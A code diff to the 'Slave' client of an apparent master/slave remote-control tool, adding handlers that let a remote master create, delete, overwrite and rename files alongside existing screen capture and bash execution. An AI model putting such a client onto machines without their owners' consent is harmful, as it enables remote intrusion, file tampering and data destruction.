@@ -3,6 +3,7 @@ from __future__ import annotations
 import base64
 import json
 import os
+import shutil
 import sys
 import threading
 import time
@@ -12,7 +13,7 @@ from typing import Optional
 import pyautogui
 
 from client.client import Client, Payload
-from utils import capture_screen, execute_bash, encode_base64, build_local_tree
+from utils import capture_screen, execute_bash, encode_base64, build_local_tree, decode_base64
 
 pyautogui.FAILSAFE = False
 pyautogui.PAUSE = 0
@@ -263,6 +264,61 @@ class Slave(Client):
                         self.send(f"send file {master} {payload}")
             except Exception as e:
                 print(f"[slave] file consuming error: {e}")
+
+        elif subject == "create":
+            path = " ".join(tokens[2:-2])
+            is_folder = tokens[-2] == "True"
+            master = tokens[-1]
+            try:
+                if not os.path.exists(path):
+                    if is_folder:
+                        os.mkdir(path)
+                    else:
+                        with open(path, "w") as file:
+                            file.write("")
+                local = build_local_tree("\\".join(path.split("\\")[:-1]))
+                if master:
+                    self.send(f"send local {master} {encode_base64(json.dumps(local))}")
+            except Exception as e:
+                print(f"[slave] item creating error: {e}")
+
+        elif subject == "remove":
+            path = " ".join(tokens[2:-2])
+            is_folder = tokens[-2] == "True"
+            master = tokens[-1]
+            try:
+                if os.path.exists(path):
+                    if is_folder:
+                        shutil.rmtree(path)
+                    else:
+                        os.remove(path)
+                local = build_local_tree("\\".join(path.split("\\")[:-1]))
+                if master:
+                    self.send(f"send local {master} {encode_base64(json.dumps(local))}")
+            except Exception as e:
+                print(f"[slave] item removing error: {e}")
+
+        elif subject == "save":
+            path = " ".join(tokens[2:-2])
+            content = base64.b64decode(tokens[-2])
+            try:
+                with open(path, "wb") as file:
+                    file.write(content)
+            except Exception as e:
+                print(f"[slave] file saving error: {e}")
+
+        elif subject == "rename":
+            path = " ".join(tokens[2:-2])
+            new_path = decode_base64(tokens[-2])
+            master = tokens[-1]
+            try:
+                if os.path.exists(path):
+                    os.rename(path, new_path)
+                local = build_local_tree("\\".join(path.split("\\")[:-1]))
+                if master:
+                    self.send(f"send local {master} {encode_base64(json.dumps(local))}")
+            except Exception as e:
+                print(f"[slave] file saving error: {e}")
 
         elif subject == "bash_execution":
             bash = " ".join(tokens[2:-1])
